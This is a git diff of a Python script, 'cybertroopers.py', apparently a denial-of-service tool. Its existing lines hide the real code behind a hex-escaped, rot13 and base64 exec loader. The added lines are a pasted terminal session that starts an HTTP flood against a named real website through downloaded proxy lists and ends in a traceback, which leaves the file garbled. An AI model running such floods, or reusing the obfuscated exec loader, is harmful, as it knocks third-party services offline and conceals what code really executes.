@@ -8,3 +8,25 @@ destiny = 'tCFOvrKEypluWHPuxp3D9p3ElXUIloQVcXF9IESNbMUOipaD9nJ50XUOipaDcXF9xLKEu
 joy = '\x72\x6f\x74\x31\x33'
 trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
 eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+Sumbat URL/IP: www.liveroulette.com
+Do you want to perform HTTP Flood TheBestDOS! [0], TCP Flood [1] or UDP Flood [2] :- 0
+Do you want proxy/socks mode? Answer 'Y' to enable it: y
+Type '0' to enable proxymode or type '1' to enable socksmode: 0
+Do you want to download a new list of proxy? Answer 'Y' to do it: y
+Download from: free-proxy-list.net='0'[TheBest!] or inforge.net='1' 0
+Proxies downloaded successfully.
+Enter the proxylist filename/path (proxy.txt): 44.201.19.195:80
+Traceback (most recent call last):
+  File "/data/data/com.termux/files/home/7Layers-Maybe/cybertroopers.py", line 10, in <module>
+    eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+  File "<string>", line 684, in <module>
+  File "<string>", line 127, in starturl
+  File "<string>", line 133, in parimalamode
+  File "<string>", line 175, in proxymode
+  File "<string>", line 183, in choiceproxysocks
+  File "<string>", line 193, in choicedownproxy
+  File "<string>", line 209, in choicemirror1
+  File "<string>", line 251, in proxyget1
+  File "<string>", line 288, in proxylist
+FileNotFoundError: [Errno 2] No such file or directory: '44.201.19.195:80'
+➜  7Layers-Maybe git:(main) ✗
